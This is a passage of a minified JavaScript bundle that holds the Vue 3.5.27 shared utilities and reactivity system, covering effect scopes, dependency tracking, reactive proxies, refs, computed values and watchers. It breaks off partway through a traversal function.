var Mi = Object.defineProperty;
var Pi = (e, t, s) => t in e ? Mi(e, t, { enumerable: !0, configurable: !0, writable: !0, value: s }) : e[t] = s;
var Dt = (e, t, s) => Pi(e, typeof t != "symbol" ? t + "" : t, s);
/**
* @vue/shared v3.5.27
* (c) 2018-present Yuxi (Evan) You and Vue contributors
* @license MIT
**/
// @__NO_SIDE_EFFECTS__
function As(e) {
  const t = /* @__PURE__ */ Object.create(null);
  for (const s of e.split(",")) t[s] = 1;
  return (s) => s in t;
}
const U = {}, Qe = [], we = () => {
}, In = () => !1, kt = (e) => e.charCodeAt(0) === 111 && e.charCodeAt(1) === 110 && // uppercase letter
(e.charCodeAt(2) > 122 || e.charCodeAt(2) < 97), Os = (e) => e.startsWith("onUpdate:"), k = Object.assign, Is = (e, t) => {
  const s = e.indexOf(t);
  s > -1 && e.splice(s, 1);
}, Ri = Object.prototype.hasOwnProperty, H = (e, t) => Ri.call(e, t), M = Array.isArray, ht = (e) => Yt(e) === "[object Map]", Fi = (e) => Yt(e) === "[object Set]", I = (e) => typeof e == "function", J = (e) => typeof e == "string", it = (e) => typeof e == "symbol", q = (e) => e !== null && typeof e == "object", Mn = (e) => (q(e) || I(e)) && I(e.then) && I(e.catch), Di = Object.prototype.toString, Yt = (e) => Di.call(e), ji = (e) => Yt(e).slice(8, -1), Hi = (e) => Yt(e) === "[object Object]", Ms = (e) => J(e) && e !== "NaN" && e[0] !== "-" && "" + parseInt(e, 10) === e, pt = /* @__PURE__ */ As(
  // the leading comma is intentional so empty string "" is also included
  ",key,ref,ref_for,ref_key,onVnodeBeforeMount,onVnodeMounted,onVnodeBeforeUpdate,onVnodeUpdated,onVnodeBeforeUnmount,onVnodeUnmounted"
), Zt = (e) => {
  const t = /* @__PURE__ */ Object.create(null);
  return (s) => t[s] || (t[s] = e(s));
}, Li = /-\w/g, Ne = Zt(
  (e) => e.replace(Li, (t) => t.slice(1).toUpperCase())
), Ni = /\B([A-Z])/g, ze = Zt(
  (e) => e.replace(Ni, "-$1").toLowerCase()
), Pn = Zt((e) => e.charAt(0).toUpperCase() + e.slice(1)), rs = Zt(
  (e) => e ? `on${Pn(e)}` : ""
), Le = (e, t) => !Object.is(e, t), os = (e, ...t) => {
  for (let s = 0; s < e.length; s++)
    e[s](...t);
}, Rn = (e, t, s, n = !1) => {
  Object.defineProperty(e, t, {
    configurable: !0,
    enumerable: !1,
    writable: n,
    value: s
  });
}, $i = (e) => {
  const t = parseFloat(e);
  return isNaN(t) ? e : t;
};
let en;
const Xt = () => en || (en = typeof globalThis < "u" ? globalThis : typeof self < "u" ? self : typeof window < "u" ? window : typeof global < "u" ? global : {});
function Ps(e) {
  if (M(e)) {
    const t = {};
    for (let s = 0; s < e.length; s++) {
      const n = e[s], i = J(n) ? Bi(n) : Ps(n);
      if (i)
        for (const r in i)
          t[r] = i[r];
    }
    return t;
  } else if (J(e) || q(e))
    return e;
}
const Vi = /;(?![^(]*\))/g, Ui = /:([^]+)/, Wi = /\/\*[^]*?\*\//g;
function Bi(e) {
  const t = {};
  return e.replace(Wi, "").split(Vi).forEach((s) => {
    if (s) {
      const n = s.split(Ui);
      n.length > 1 && (t[n[0].trim()] = n[1].trim());
    }
  }), t;
}
function Rs(e) {
  let t = "";
  if (J(e))
    t = e;
  else if (M(e))
    for (let s = 0; s < e.length; s++) {
      const n = Rs(e[s]);
      n && (t += n + " ");
    }
  else if (q(e))
    for (const s in e)
      e[s] && (t += s + " ");
  return t.trim();
}
const Ki = "itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly", qi = /* @__PURE__ */ As(Ki);
function Fn(e) {
  return !!e || e === "";
}
/**
* @vue/reactivity v3.5.27
* (c) 2018-present Yuxi (Evan) You and Vue contributors
* @license MIT
**/
let re;
class Gi {
  constructor(t = !1) {
    this.detached = t, this._active = !0, this._on = 0, this.effects = [], this.cleanups = [], this._isPaused = !1, this.parent = re, !t && re && (this.index = (re.scopes || (re.scopes = [])).push(
      this
    ) - 1);
  }
  get active() {
    return this._active;
  }
  pause() {
    if (this._active) {
      this._isPaused = !0;
      let t, s;
      if (this.scopes)
        for (t = 0, s = this.scopes.length; t < s; t++)
          this.scopes[t].pause();
      for (t = 0, s = this.effects.length; t < s; t++)
        this.effects[t].pause();
    }
  }
  /**
   * Resumes the effect scope, including all child scopes and effects.
   */
  resume() {
    if (this._active && this._isPaused) {
      this._isPaused = !1;
      let t, s;
      if (this.scopes)
        for (t = 0, s = this.scopes.length; t < s; t++)
          this.scopes[t].resume();
      for (t = 0, s = this.effects.length; t < s; t++)
        this.effects[t].resume();
    }
  }
  run(t) {
    if (this._active) {
      const s = re;
      try {
        return re = this, t();
      } finally {
        re = s;
      }
    }
  }
  /**
   * This should only be called on non-detached scopes
   * @internal
   */
  on() {
    ++this._on === 1 && (this.prevScope = re, re = this);
  }
  /**
   * This should only be called on non-detached scopes
   * @internal
   */
  off() {
    this._on > 0 && --this._on === 0 && (re = this.prevScope, this.prevScope = void 0);
  }
  stop(t) {
    if (this._active) {
      this._active = !1;
      let s, n;
      for (s = 0, n = this.effects.length; s < n; s++)
        this.effects[s].stop();
      for (this.effects.length = 0, s = 0, n = this.cleanups.length; s < n; s++)
        this.cleanups[s]();
      if (this.cleanups.length = 0, this.scopes) {
        for (s = 0, n = this.scopes.length; s < n; s++)
          this.scopes[s].stop(!0);
        this.scopes.length = 0;
      }
      if (!this.detached && this.parent && !t) {
        const i = this.parent.scopes.pop();
        i && i !== this && (this.parent.scopes[this.index] = i, i.index = this.index);
      }
      this.parent = void 0;
    }
  }
}
function Ji() {
  return re;
}
let V;
const ls = /* @__PURE__ */ new WeakSet();
class Dn {
  constructor(t) {
    this.fn = t, this.deps = void 0, this.depsTail = void 0, this.flags = 5, this.next = void 0, this.cleanup = void 0, this.scheduler = void 0, re && re.active && re.effects.push(this);
  }
  pause() {
    this.flags |= 64;
  }
  resume() {
    this.flags & 64 && (this.flags &= -65, ls.has(this) && (ls.delete(this), this.trigger()));
  }
  /**
   * @internal
   */
  notify() {
    this.flags & 2 && !(this.flags & 32) || this.flags & 8 || Hn(this);
  }
  run() {
    if (!(this.flags & 1))
      return this.fn();
    this.flags |= 2, tn(this), Ln(this);
    const t = V, s = ue;
    V = this, ue = !0;
    try {
      return this.fn();
    } finally {
      Nn(this), V = t, ue = s, this.flags &= -3;
    }
  }
  stop() {
    if (this.flags & 1) {
      for (let t = this.deps; t; t = t.nextDep)
        js(t);
      this.deps = this.depsTail = void 0, tn(this), this.onStop && this.onStop(), this.flags &= -2;
    }
  }
  trigger() {
    this.flags & 64 ? ls.add(this) : this.scheduler ? this.scheduler() : this.runIfDirty();
  }
  /**
   * @internal
   */
  runIfDirty() {
    ms(this) && this.run();
  }
  get dirty() {
    return ms(this);
  }
}
let jn = 0, gt, mt;
function Hn(e, t = !1) {
  if (e.flags |= 8, t) {
    e.next = mt, mt = e;
    return;
  }
  e.next = gt, gt = e;
}
function Fs() {
  jn++;
}
function Ds() {
  if (--jn > 0)
    return;
  if (mt) {
    let t = mt;
    for (mt = void 0; t; ) {
      const s = t.next;
      t.next = void 0, t.flags &= -9, t = s;
    }
  }
  let e;
  for (; gt; ) {
    let t = gt;
    for (gt = void 0; t; ) {
      const s = t.next;
      if (t.next = void 0, t.flags &= -9, t.flags & 1)
        try {
          t.trigger();
        } catch (n) {
          e || (e = n);
        }
      t = s;
    }
  }
  if (e) throw e;
}
function Ln(e) {
  for (let t = e.deps; t; t = t.nextDep)
    t.version = -1, t.prevActiveLink = t.dep.activeLink, t.dep.activeLink = t;
}
function Nn(e) {
  let t, s = e.depsTail, n = s;
  for (; n; ) {
    const i = n.prevDep;
    n.version === -1 ? (n === s && (s = i), js(n), zi(n)) : t = n, n.dep.activeLink = n.prevActiveLink, n.prevActiveLink = void 0, n = i;
  }
  e.deps = t, e.depsTail = s;
}
function ms(e) {
  for (let t = e.deps; t; t = t.nextDep)
    if (t.dep.version !== t.version || t.dep.computed && ($n(t.dep.computed) || t.dep.version !== t.version))
      return !0;
  return !!e._dirty;
}
function $n(e) {
  if (e.flags & 4 && !(e.flags & 16) || (e.flags &= -17, e.globalVersion === yt) || (e.globalVersion = yt, !e.isSSR && e.flags & 128 && (!e.deps && !e._dirty || !ms(e))))
    return;
  e.flags |= 2;
  const t = e.dep, s = V, n = ue;
  V = e, ue = !0;
  try {
    Ln(e);
    const i = e.fn(e._value);
    (t.version === 0 || Le(i, e._value)) && (e.flags |= 128, e._value = i, t.version++);
  } catch (i) {
    throw t.version++, i;
  } finally {
    V = s, ue = n, Nn(e), e.flags &= -3;
  }
}
function js(e, t = !1) {
  const { dep: s, prevSub: n, nextSub: i } = e;
  if (n && (n.nextSub = i, e.prevSub = void 0), i && (i.prevSub = n, e.nextSub = void 0), s.subs === e && (s.subs = n, !n && s.computed)) {
    s.computed.flags &= -5;
    for (let r = s.computed.deps; r; r = r.nextDep)
      js(r, !0);
  }
  !t && !--s.sc && s.map && s.map.delete(s.key);
}
function zi(e) {
  const { prevDep: t, nextDep: s } = e;
  t && (t.nextDep = s, e.prevDep = void 0), s && (s.prevDep = t, e.nextDep = void 0);
}
let ue = !0;
const Vn = [];
function Ae() {
  Vn.push(ue), ue = !1;
}
function Oe() {
  const e = Vn.pop();
  ue = e === void 0 ? !0 : e;
}
function tn(e) {
  const { cleanup: t } = e;
  if (e.cleanup = void 0, t) {
    const s = V;
    V = void 0;
    try {
      t();
    } finally {
      V = s;
    }
  }
}
let yt = 0;
class ki {
  constructor(t, s) {
    this.sub = t, this.dep = s, this.version = s.version, this.nextDep = this.prevDep = this.nextSub = this.prevSub = this.prevActiveLink = void 0;
  }
}
class Hs {
  // TODO isolatedDeclarations "__v_skip"
  constructor(t) {
    this.computed = t, this.version = 0, this.activeLink = void 0, this.subs = void 0, this.map = void 0, this.key = void 0, this.sc = 0, this.__v_skip = !0;
  }
  track(t) {
    if (!V || !ue || V === this.computed)
      return;
    let s = this.activeLink;
    if (s === void 0 || s.sub !== V)
      s = this.activeLink = new ki(V, this), V.deps ? (s.prevDep = V.depsTail, V.depsTail.nextDep = s, V.depsTail = s) : V.deps = V.depsTail = s, Un(s);
    else if (s.version === -1 && (s.version = this.version, s.nextDep)) {
      const n = s.nextDep;
      n.prevDep = s.prevDep, s.prevDep && (s.prevDep.nextDep = n), s.prevDep = V.depsTail, s.nextDep = void 0, V.depsTail.nextDep = s, V.depsTail = s, V.deps === s && (V.deps = n);
    }
    return s;
  }
  trigger(t) {
    this.version++, yt++, this.notify(t);
  }
  notify(t) {
    Fs();
    try {
      for (let s = this.subs; s; s = s.prevSub)
        s.sub.notify() && s.sub.dep.notify();
    } finally {
      Ds();
    }
  }
}
function Un(e) {
  if (e.dep.sc++, e.sub.flags & 4) {
    const t = e.dep.computed;
    if (t && !e.dep.subs) {
      t.flags |= 20;
      for (let n = t.deps; n; n = n.nextDep)
        Un(n);
    }
    const s = e.dep.subs;
    s !== e && (e.prevSub = s, s && (s.nextSub = e)), e.dep.subs = e;
  }
}
const _s = /* @__PURE__ */ new WeakMap(), Je = /* @__PURE__ */ Symbol(
  ""
), bs = /* @__PURE__ */ Symbol(
  ""
), wt = /* @__PURE__ */ Symbol(
  ""
);
function Y(e, t, s) {
  if (ue && V) {
    let n = _s.get(e);
    n || _s.set(e, n = /* @__PURE__ */ new Map());
    let i = n.get(s);
    i || (n.set(s, i = new Hs()), i.map = n, i.key = s), i.track();
  }
}
function Te(e, t, s, n, i, r) {
  const o = _s.get(e);
  if (!o) {
    yt++;
    return;
  }
  const l = (f) => {
    f && f.trigger();
  };
  if (Fs(), t === "clear")
    o.forEach(l);
  else {
    const f = M(e), h = f && Ms(s);
    if (f && s === "length") {
      const a = Number(n);
      o.forEach((p, w) => {
        (w === "length" || w === wt || !it(w) && w >= a) && l(p);
      });
    } else
      switch ((s !== void 0 || o.has(void 0)) && l(o.get(s)), h && l(o.get(wt)), t) {
        case "add":
          f ? h && l(o.get("length")) : (l(o.get(Je)), ht(e) && l(o.get(bs)));
          break;
        case "delete":
          f || (l(o.get(Je)), ht(e) && l(o.get(bs)));
          break;
        case "set":
          ht(e) && l(o.get(Je));
          break;
      }
  }
  Ds();
}
function ke(e) {
  const t = /* @__PURE__ */ j(e);
  return t === e ? t : (Y(t, "iterate", wt), /* @__PURE__ */ ae(e) ? t : t.map(Ie));
}
function Ls(e) {
  return Y(e = /* @__PURE__ */ j(e), "iterate", wt), e;
}
function Fe(e, t) {
  return /* @__PURE__ */ $e(e) ? St(/* @__PURE__ */ et(e) ? Ie(t) : t) : Ie(t);
}
const Yi = {
  __proto__: null,
  [Symbol.iterator]() {
    return cs(this, Symbol.iterator, (e) => Fe(this, e));
  },
  concat(...e) {
    return ke(this).concat(
      ...e.map((t) => M(t) ? ke(t) : t)
    );
  },
  entries() {
    return cs(this, "entries", (e) => (e[1] = Fe(this, e[1]), e));
  },
  every(e, t) {
    return Ce(this, "every", e, t, void 0, arguments);
  },
  filter(e, t) {
    return Ce(
      this,
      "filter",
      e,
      t,
      (s) => s.map((n) => Fe(this, n)),
      arguments
    );
  },
  find(e, t) {
    return Ce(
      this,
      "find",
      e,
      t,
      (s) => Fe(this, s),
      arguments
    );
  },
  findIndex(e, t) {
    return Ce(this, "findIndex", e, t, void 0, arguments);
  },
  findLast(e, t) {
    return Ce(
      this,
      "findLast",
      e,
      t,
      (s) => Fe(this, s),
      arguments
    );
  },
  findLastIndex(e, t) {
    return Ce(this, "findLastIndex", e, t, void 0, arguments);
  },
  // flat, flatMap could benefit from ARRAY_ITERATE but are not straight-forward to implement
  forEach(e, t) {
    return Ce(this, "forEach", e, t, void 0, arguments);
  },
  includes(...e) {
    return fs(this, "includes", e);
  },
  indexOf(...e) {
    return fs(this, "indexOf", e);
  },
  join(e) {
    return ke(this).join(e);
  },
  // keys() iterator only reads `length`, no optimization required
  lastIndexOf(...e) {
    return fs(this, "lastIndexOf", e);
  },
  map(e, t) {
    return Ce(this, "map", e, t, void 0, arguments);
  },
  pop() {
    return ft(this, "pop");
  },
  push(...e) {
    return ft(this, "push", e);
  },
  reduce(e, ...t) {
    return sn(this, "reduce", e, t);
  },
  reduceRight(e, ...t) {
    return sn(this, "reduceRight", e, t);
  },
  shift() {
    return ft(this, "shift");
  },
  // slice could use ARRAY_ITERATE but also seems to beg for range tracking
  some(e, t) {
    return Ce(this, "some", e, t, void 0, arguments);
  },
  splice(...e) {
    return ft(this, "splice", e);
  },
  toReversed() {
    return ke(this).toReversed();
  },
  toSorted(e) {
    return ke(this).toSorted(e);
  },
  toSpliced(...e) {
    return ke(this).toSpliced(...e);
  },
  unshift(...e) {
    return ft(this, "unshift", e);
  },
  values() {
    return cs(this, "values", (e) => Fe(this, e));
  }
};
function cs(e, t, s) {
  const n = Ls(e), i = n[t]();
  return n !== e && !/* @__PURE__ */ ae(e) && (i._next = i.next, i.next = () => {
    const r = i._next();
    return r.done || (r.value = s(r.value)), r;
  }), i;
}
const Zi = Array.prototype;
function Ce(e, t, s, n, i, r) {
  const o = Ls(e), l = o !== e && !/* @__PURE__ */ ae(e), f = o[t];
  if (f !== Zi[t]) {
    const p = f.apply(e, r);
    return l ? Ie(p) : p;
  }
  let h = s;
  o !== e && (l ? h = function(p, w) {
    return s.call(this, Fe(e, p), w, e);
  } : s.length > 2 && (h = function(p, w) {
    return s.call(this, p, w, e);
  }));
  const a = f.call(o, h, n);
  return l && i ? i(a) : a;
}
function sn(e, t, s, n) {
  const i = Ls(e);
  let r = s;
  return i !== e && (/* @__PURE__ */ ae(e) ? s.length > 3 && (r = function(o, l, f) {
    return s.call(this, o, l, f, e);
  }) : r = function(o, l, f) {
    return s.call(this, o, Fe(e, l), f, e);
  }), i[t](r, ...n);
}
function fs(e, t, s) {
  const n = /* @__PURE__ */ j(e);
  Y(n, "iterate", wt);
  const i = n[t](...s);
  return (i === -1 || i === !1) && /* @__PURE__ */ Us(s[0]) ? (s[0] = /* @__PURE__ */ j(s[0]), n[t](...s)) : i;
}
function ft(e, t, s = []) {
  Ae(), Fs();
  const n = (/* @__PURE__ */ j(e))[t].apply(e, s);
  return Ds(), Oe(), n;
}
const Xi = /* @__PURE__ */ As("__proto__,__v_isRef,__isVue"), Wn = new Set(
  /* @__PURE__ */ Object.getOwnPropertyNames(Symbol).filter((e) => e !== "arguments" && e !== "caller").map((e) => Symbol[e]).filter(it)
);
function Qi(e) {
  it(e) || (e = String(e));
  const t = /* @__PURE__ */ j(this);
  return Y(t, "has", e), t.hasOwnProperty(e);
}
class Bn {
  constructor(t = !1, s = !1) {
    this._isReadonly = t, this._isShallow = s;
  }
  get(t, s, n) {
    if (s === "__v_skip") return t.__v_skip;
    const i = this._isReadonly, r = this._isShallow;
    if (s === "__v_isReactive")
      return !i;
    if (s === "__v_isReadonly")
      return i;
    if (s === "__v_isShallow")
      return r;
    if (s === "__v_raw")
      return n === (i ? r ? fr : Jn : r ? Gn : qn).get(t) || // receiver is not the reactive proxy, but has the same prototype
      // this means the receiver is a user proxy of the reactive proxy
      Object.getPrototypeOf(t) === Object.getPrototypeOf(n) ? t : void 0;
    const o = M(t);
    if (!i) {
      let f;
      if (o && (f = Yi[s]))
        return f;
      if (s === "hasOwnProperty")
        return Qi;
    }
    const l = Reflect.get(
      t,
      s,
      // if this is a proxy wrapping a ref, return methods using the raw ref
      // as receiver so that we don't have to call `toRaw` on the ref in all
      // its class methods
      /* @__PURE__ */ Z(t) ? t : n
    );
    if ((it(s) ? Wn.has(s) : Xi(s)) || (i || Y(t, "get", s), r))
      return l;
    if (/* @__PURE__ */ Z(l)) {
      const f = o && Ms(s) ? l : l.value;
      return i && q(f) ? /* @__PURE__ */ vs(f) : f;
    }
    return q(l) ? i ? /* @__PURE__ */ vs(l) : /* @__PURE__ */ $s(l) : l;
  }
}
class Kn extends Bn {
  constructor(t = !1) {
    super(!1, t);
  }
  set(t, s, n, i) {
    let r = t[s];
    const o = M(t) && Ms(s);
    if (!this._isShallow) {
      const h = /* @__PURE__ */ $e(r);
      if (!/* @__PURE__ */ ae(n) && !/* @__PURE__ */ $e(n) && (r = /* @__PURE__ */ j(r), n = /* @__PURE__ */ j(n)), !o && /* @__PURE__ */ Z(r) && !/* @__PURE__ */ Z(n))
        return h || (r.value = n), !0;
    }
    const l = o ? Number(s) < t.length : H(t, s), f = Reflect.set(
      t,
      s,
      n,
      /* @__PURE__ */ Z(t) ? t : i
    );
    return t === /* @__PURE__ */ j(i) && (l ? Le(n, r) && Te(t, "set", s, n) : Te(t, "add", s, n)), f;
  }
  deleteProperty(t, s) {
    const n = H(t, s);
    t[s];
    const i = Reflect.deleteProperty(t, s);
    return i && n && Te(t, "delete", s, void 0), i;
  }
  has(t, s) {
    const n = Reflect.has(t, s);
    return (!it(s) || !Wn.has(s)) && Y(t, "has", s), n;
  }
  ownKeys(t) {
    return Y(
      t,
      "iterate",
      M(t) ? "length" : Je
    ), Reflect.ownKeys(t);
  }
}
class er extends Bn {
  constructor(t = !1) {
    super(!0, t);
  }
  set(t, s) {
    return !0;
  }
  deleteProperty(t, s) {
    return !0;
  }
}
const tr = /* @__PURE__ */ new Kn(), sr = /* @__PURE__ */ new er(), nr = /* @__PURE__ */ new Kn(!0);
const xs = (e) => e, jt = (e) => Reflect.getPrototypeOf(e);
function ir(e, t, s) {
  return function(...n) {
    const i = this.__v_raw, r = /* @__PURE__ */ j(i), o = ht(r), l = e === "entries" || e === Symbol.iterator && o, f = e === "keys" && o, h = i[e](...n), a = s ? xs : t ? St : Ie;
    return !t && Y(
      r,
      "iterate",
      f ? bs : Je
    ), k(
      // inheriting all iterator properties
      Object.create(h),
      {
        // iterator protocol
        next() {
          const { value: p, done: w } = h.next();
          return w ? { value: p, done: w } : {
            value: l ? [a(p[0]), a(p[1])] : a(p),
            done: w
          };
        }
      }
    );
  };
}
function Ht(e) {
  return function(...t) {
    return e === "delete" ? !1 : e === "clear" ? void 0 : this;
  };
}
function rr(e, t) {
  const s = {
    get(i) {
      const r = this.__v_raw, o = /* @__PURE__ */ j(r), l = /* @__PURE__ */ j(i);
      e || (Le(i, l) && Y(o, "get", i), Y(o, "get", l));
      const { has: f } = jt(o), h = t ? xs : e ? St : Ie;
      if (f.call(o, i))
        return h(r.get(i));
      if (f.call(o, l))
        return h(r.get(l));
      r !== o && r.get(i);
    },
    get size() {
      const i = this.__v_raw;
      return !e && Y(/* @__PURE__ */ j(i), "iterate", Je), i.size;
    },
    has(i) {
      const r = this.__v_raw, o = /* @__PURE__ */ j(r), l = /* @__PURE__ */ j(i);
      return e || (Le(i, l) && Y(o, "has", i), Y(o, "has", l)), i === l ? r.has(i) : r.has(i) || r.has(l);
    },
    forEach(i, r) {
      const o = this, l = o.__v_raw, f = /* @__PURE__ */ j(l), h = t ? xs : e ? St : Ie;
      return !e && Y(f, "iterate", Je), l.forEach((a, p) => i.call(r, h(a), h(p), o));
    }
  };
  return k(
    s,
    e ? {
      add: Ht("add"),
      set: Ht("set"),
      delete: Ht("delete"),
      clear: Ht("clear")
    } : {
      add(i) {
        !t && !/* @__PURE__ */ ae(i) && !/* @__PURE__ */ $e(i) && (i = /* @__PURE__ */ j(i));
        const r = /* @__PURE__ */ j(this);
        return jt(r).has.call(r, i) || (r.add(i), Te(r, "add", i, i)), this;
      },
      set(i, r) {
        !t && !/* @__PURE__ */ ae(r) && !/* @__PURE__ */ $e(r) && (r = /* @__PURE__ */ j(r));
        const o = /* @__PURE__ */ j(this), { has: l, get: f } = jt(o);
        let h = l.call(o, i);
        h || (i = /* @__PURE__ */ j(i), h = l.call(o, i));
        const a = f.call(o, i);
        return o.set(i, r), h ? Le(r, a) && Te(o, "set", i, r) : Te(o, "add", i, r), this;
      },
      delete(i) {
        const r = /* @__PURE__ */ j(this), { has: o, get: l } = jt(r);
        let f = o.call(r, i);
        f || (i = /* @__PURE__ */ j(i), f = o.call(r, i)), l && l.call(r, i);
        const h = r.delete(i);
        return f && Te(r, "delete", i, void 0), h;
      },
      clear() {
        const i = /* @__PURE__ */ j(this), r = i.size !== 0, o = i.clear();
        return r && Te(
          i,
          "clear",
          void 0,
          void 0
        ), o;
      }
    }
  ), [
    "keys",
    "values",
    "entries",
    Symbol.iterator
  ].forEach((i) => {
    s[i] = ir(i, e, t);
  }), s;
}
function Ns(e, t) {
  const s = rr(e, t);
  return (n, i, r) => i === "__v_isReactive" ? !e : i === "__v_isReadonly" ? e : i === "__v_raw" ? n : Reflect.get(
    H(s, i) && i in n ? s : n,
    i,
    r
  );
}
const or = {
  get: /* @__PURE__ */ Ns(!1, !1)
}, lr = {
  get: /* @__PURE__ */ Ns(!1, !0)
}, cr = {
  get: /* @__PURE__ */ Ns(!0, !1)
};
const qn = /* @__PURE__ */ new WeakMap(), Gn = /* @__PURE__ */ new WeakMap(), Jn = /* @__PURE__ */ new WeakMap(), fr = /* @__PURE__ */ new WeakMap();
function ur(e) {
  switch (e) {
    case "Object":
    case "Array":
      return 1;
    case "Map":
    case "Set":
    case "WeakMap":
    case "WeakSet":
      return 2;
    default:
      return 0;
  }
}
function ar(e) {
  return e.__v_skip || !Object.isExtensible(e) ? 0 : ur(ji(e));
}
// @__NO_SIDE_EFFECTS__
function $s(e) {
  return /* @__PURE__ */ $e(e) ? e : Vs(
    e,
    !1,
    tr,
    or,
    qn
  );
}
// @__NO_SIDE_EFFECTS__
function dr(e) {
  return Vs(
    e,
    !1,
    nr,
    lr,
    Gn
  );
}
// @__NO_SIDE_EFFECTS__
function vs(e) {
  return Vs(
    e,
    !0,
    sr,
    cr,
    Jn
  );
}
function Vs(e, t, s, n, i) {
  if (!q(e) || e.__v_raw && !(t && e.__v_isReactive))
    return e;
  const r = ar(e);
  if (r === 0)
    return e;
  const o = i.get(e);
  if (o)
    return o;
  const l = new Proxy(
    e,
    r === 2 ? n : s
  );
  return i.set(e, l), l;
}
// @__NO_SIDE_EFFECTS__
function et(e) {
  return /* @__PURE__ */ $e(e) ? /* @__PURE__ */ et(e.__v_raw) : !!(e && e.__v_isReactive);
}
// @__NO_SIDE_EFFECTS__
function $e(e) {
  return !!(e && e.__v_isReadonly);
}
// @__NO_SIDE_EFFECTS__
function ae(e) {
  return !!(e && e.__v_isShallow);
}
// @__NO_SIDE_EFFECTS__
function Us(e) {
  return e ? !!e.__v_raw : !1;
}
// @__NO_SIDE_EFFECTS__
function j(e) {
  const t = e && e.__v_raw;
  return t ? /* @__PURE__ */ j(t) : e;
}
function hr(e) {
  return !H(e, "__v_skip") && Object.isExtensible(e) && Rn(e, "__v_skip", !0), e;
}
const Ie = (e) => q(e) ? /* @__PURE__ */ $s(e) : e, St = (e) => q(e) ? /* @__PURE__ */ vs(e) : e;
// @__NO_SIDE_EFFECTS__
function Z(e) {
  return e ? e.__v_isRef === !0 : !1;
}
// @__NO_SIDE_EFFECTS__
function nn(e) {
  return pr(e, !1);
}
function pr(e, t) {
  return /* @__PURE__ */ Z(e) ? e : new gr(e, t);
}
class gr {
  constructor(t, s) {
    this.dep = new Hs(), this.__v_isRef = !0, this.__v_isShallow = !1, this._rawValue = s ? t : /* @__PURE__ */ j(t), this._value = s ? t : Ie(t), this.__v_isShallow = s;
  }
  get value() {
    return this.dep.track(), this._value;
  }
  set value(t) {
    const s = this._rawValue, n = this.__v_isShallow || /* @__PURE__ */ ae(t) || /* @__PURE__ */ $e(t);
    t = n ? t : /* @__PURE__ */ j(t), Le(t, s) && (this._rawValue = t, this._value = n ? t : Ie(t), this.dep.trigger());
  }
}
function mr(e) {
  return /* @__PURE__ */ Z(e) ? e.value : e;
}
const _r = {
  get: (e, t, s) => t === "__v_raw" ? e : mr(Reflect.get(e, t, s)),
  set: (e, t, s, n) => {
    const i = e[t];
    return /* @__PURE__ */ Z(i) && !/* @__PURE__ */ Z(s) ? (i.value = s, !0) : Reflect.set(e, t, s, n);
  }
};
function zn(e) {
  return /* @__PURE__ */ et(e) ? e : new Proxy(e, _r);
}
class br {
  constructor(t, s, n) {
    this.fn = t, this.setter = s, this._value = void 0, this.dep = new Hs(this), this.__v_isRef = !0, this.deps = void 0, this.depsTail = void 0, this.flags = 16, this.globalVersion = yt - 1, this.next = void 0, this.effect = this, this.__v_isReadonly = !s, this.isSSR = n;
  }
  /**
   * @internal
   */
  notify() {
    if (this.flags |= 16, !(this.flags & 8) && // avoid infinite self recursion
    V !== this)
      return Hn(this, !0), !0;
  }
  get value() {
    const t = this.dep.track();
    return $n(this), t && (t.version = this.dep.version), this._value;
  }
  set value(t) {
    this.setter && this.setter(t);
  }
}
// @__NO_SIDE_EFFECTS__
function xr(e, t, s = !1) {
  let n, i;
  return I(e) ? n = e : (n = e.get, i = e.set), new br(n, i, s);
}
const Lt = {}, Ut = /* @__PURE__ */ new WeakMap();
let Ge;
function vr(e, t = !1, s = Ge) {
  if (s) {
    let n = Ut.get(s);
    n || Ut.set(s, n = []), n.push(e);
  }
}
function yr(e, t, s = U) {
  const { immediate: n, deep: i, once: r, scheduler: o, augmentJob: l, call: f } = s, h = (A) => i ? A : /* @__PURE__ */ ae(A) || i === !1 || i === 0 ? He(A, 1) : He(A);
  let a, p, w, C, P = !1, F = !1;
  if (/* @__PURE__ */ Z(e) ? (p = () => e.value, P = /* @__PURE__ */ ae(e)) : /* @__PURE__ */ et(e) ? (p = () => h(e), P = !0) : M(e) ? (F = !0, P = e.some((A) => /* @__PURE__ */ et(A) || /* @__PURE__ */ ae(A)), p = () => e.map((A) => {
    if (/* @__PURE__ */ Z(A))
      return A.value;
    if (/* @__PURE__ */ et(A))
      return h(A);
    if (I(A))
      return f ? f(A, 2) : A();
  })) : I(e) ? t ? p = f ? () => f(e, 2) : e : p = () => {
    if (w) {
      Ae();
      try {
        w();
      } finally {
        Oe();
      }
    }
    const A = Ge;
    Ge = a;
    try {
      return f ? f(e, 3, [C]) : e(C);
    } finally {
      Ge = A;
    }
  } : p = we, t && i) {
    const A = p, G = i === !0 ? 1 / 0 : i;
    p = () => He(A(), G);
  }
  const X = Ji(), D = () => {
    a.stop(), X && X.active && Is(X.effects, a);
  };
  if (r && t) {
    const A = t;
    t = (...G) => {
      A(...G), D();
    };
  }
  let W = F ? new Array(e.length).fill(Lt) : Lt;
  const K = (A) => {
    if (!(!(a.flags & 1) || !a.dirty && !A))
      if (t) {
        const G = a.run();
        if (i || P || (F ? G.some((Pe, de) => Le(Pe, W[de])) : Le(G, W))) {
          w && w();
          const Pe = Ge;
          Ge = a;
          try {
            const de = [
              G,
              // pass undefined as the old value when it's changed for the first time
              W === Lt ? void 0 : F && W[0] === Lt ? [] : W,
              C
            ];
            W = G, f ? f(t, 3, de) : (
              // @ts-expect-error
              t(...de)
            );
          } finally {
            Ge = Pe;
          }
        }
      } else
        a.run();
  };
  return l && l(K), a = new Dn(p), a.scheduler = o ? () => o(K, !1) : K, C = (A) => vr(A, !1, a), w = a.onStop = () => {
    const A = Ut.get(a);
    if (A) {
      if (f)
        f(A, 4);
      else
        for (const G of A) G();
      Ut.delete(a);
    }
  }, t ? n ? K(!0) : W = a.run() : o ? o(K.bind(null, !0), !0) : a.run(), D.pause = a.pause.bind(a), D.resume = a.resume.bind(a), D.stop = D, D;
}
function He(e, t = 1 / 0, s) {
  if (t <= 0 || !q(e) || e.__v_skip || (s = s || /* @__PURE__ */ new Map(), (s.get(e) || 0) >= t))
    return e;
  if (s.set(e, t), t--, /* @__PURE__ */ Z(e))
    He(e.value, t, s);
  else if (M(e))
    for (let n = 0; n < e.length; n++)
      He(e[n], t, s);
  else if (Fi(e) || ht(e))
    e.forEach((n) => {
      He(n, t, s);
    });
  else if (Hi(e)) {
    for (const n in e)
      He(e[n], t, s);
    for (const n of Object.getOwnPropertySymbols(e))
